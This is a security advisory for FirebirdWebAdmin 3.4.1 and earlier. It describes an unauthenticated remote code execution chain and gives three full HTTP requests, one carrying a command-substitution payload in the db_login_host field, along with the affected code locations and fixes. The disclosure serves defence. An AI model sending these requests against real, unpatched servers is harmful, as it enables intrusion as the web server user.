# Security Policy

## Supported Versions

| Version | Supported          |
| ------- | ------------------ |
| 3.4.x   | :x:                |
| < 3.4   | :x:                |

All versions of FirebirdWebAdmin up to and including 3.4.1 are affected. There is no patched version available.

## Reporting a Vulnerability

I found an unauthenticated remote code execution vulnerability in FirebirdWebAdmin. The whole thing comes down to three problems working together. User input goes straight into the session without any validation, the custom shell escaping function is broken, and there are no authentication checks on admin panel access.

### What happens

In `database.php`, the `db_login_host` POST parameter gets written directly into `$s_login['host']` in the session. The value is taken as-is from user input. If you send an empty `db_login_database` along with it, the database connection code never runs but the poisoned host value stays in the session anyway.

Over on `admin.php`, the `adm_server` panel is open by default. This is set in `session.inc.php` at line 315. The `have_panel_permissions()` function only looks at whether the panel status says `'open'`. It never checks if anyone is actually logged in. Since `adm_server` starts as open the moment a session gets created, every visitor passes this check automatically.

That panel builds a `$db_path` variable from the session's `$s_login['host']` and runs it through `ibwa_escapeshellarg()` before passing it to `exec_command()`. The problem here is that `ibwa_escapeshellarg()` wraps the value in double quotes and only escapes the `"` character. It completely ignores `$`, backticks, and backslashes. In `/bin/sh`, command substitution with `$(...)` works just fine inside double quotes, so the payload passes through untouched and gets executed by `exec()`.

### Steps to reproduce

Three requests, no login needed.

**Get a session**

```http
GET /database.php HTTP/1.1
Host: localhost:8888
```

Response sets the session cookie via `Set-Cookie: firebirdwebadmin=SESSION_ID`.

**Poison the session**

```http
POST /database.php HTTP/1.1
Host: localhost:8888
Cookie: firebirdwebadmin=SESSION_ID
Content-Type: application/x-www-form-urlencoded

db_login_doit=1&db_login_database=&db_login_host=$(id>/tmp/pwned.txt)&db_login_user=a&db_login_password=a
```

**Trigger RCE**

```http
GET /admin.php HTTP/1.1
Host: localhost:8888
Cookie: firebirdwebadmin=SESSION_ID
```

After this request, `/tmp/pwned.txt` contains `uid=33(www-data) gid=33(www-data) groups=33(www-data)`.

### Affected files

`database.php:19` writes `$_POST['db_login_host']` into the session
`inc/functions.inc.php:1316` the `ibwa_escapeshellarg()` function that wraps the value
`inc/functions.inc.php:257` the `exec_command()` function that calls `exec()`
`admin.php:164-183` where `$db_path` is built and passed to `exec_command()`
`inc/session.inc.php:315` where `adm_server` is set to `'open'` by default

### How to fix

Replace `ibwa_escapeshellarg()` with PHP's built-in `escapeshellarg()`. It uses single quotes which block command substitution entirely. Validate `db_login_host` in `database.php` so it only accepts valid hostnames or IP addresses. Add real authentication checks in `have_panel_permissions()` instead of just looking at whether a panel is open.

### Severity

Critical. Unauthenticated RCE in three HTTP requests, runs as the web server user.

### Credit

Batuhan Er (int20z) of HawkTrace https://hawktrace.com
